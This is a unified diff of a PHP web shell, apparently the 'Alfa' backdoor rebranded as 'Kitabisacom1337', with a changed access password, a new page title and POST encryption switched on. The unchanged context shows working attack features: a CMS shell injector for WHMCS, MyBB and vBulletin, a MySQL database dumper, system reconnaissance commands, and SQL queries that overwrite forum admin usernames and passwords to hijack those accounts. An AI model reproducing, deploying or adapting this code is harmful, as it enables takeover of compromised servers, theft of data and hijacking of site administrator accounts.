@@ -9,11 +9,11 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
-    'safe_mode' => '0',
-    'login_page' => '403',
+    'password' => '0cfae383362bc63d7ac429a5755fef05',//md5(ehsan)
+    'safe_mode' => '1',
+    'login_page' => '500',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => true,
     'cgi_api' => true,
 );
 
@@ -255,8 +255,7 @@ $GLOBALS['__KITABISACOM1337_COLOR__'] = array(
 				".txtfont_header" => "color: {color};",
 			)
 		),
-		"options_list_text" => array(
-			"key_color" => "#FFFFFF",
+		"options_list_text" => array("key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".txtfont,.tbltxt" => "color: {color};",
 			)
@@ -533,7 +532,7 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>.: Rebirth Tesla :.</title><center>
+<title>.: Kitabisacom1337 :.</title><center>
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co.com/H4XfdZC/image.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
@@ -1515,7 +1514,7 @@ if($_POST['alfa7']=='export'){
 	$file = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
 	$config = json_encode($array, JSON_PRETTY_PRINT);
 	if(!@file_put_contents($file, $config)){
-		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
+		echo('<p><center>ColorConfig:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
 	}else{
 		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
 	}
@@ -1694,7 +1693,7 @@ echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
+ array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' =>'50'),
  'td3' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
  'td4' =>
@@ -1855,8 +1854,7 @@ function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px
 function alfaShellInjectors(){
 alfahead();
 echo '<div class=header>';
-AlfaNum(11);
-echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
+AlfaNum(11);echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
 $selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
 if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
 AlfaNum();
@@ -3426,7 +3424,7 @@ echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
+ array('color'=> 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
  'td3' =>
  array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),
  'td4' =>
@@ -3573,7 +3571,7 @@ $process=array(
 "User Accounts" => "net user",
 "Show Computers" => "net view",
 "ARP Table" => "arp -a",
-"IP Configuration" => "ipconfig /all"
+"IP Configuration"=> "ipconfig /all"
 );}else{
 $process=array(
 "Process status" => "ps aux",
@@ -4058,7 +4056,7 @@ $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $hash = md5('solevisible');
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean= 'admin'") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
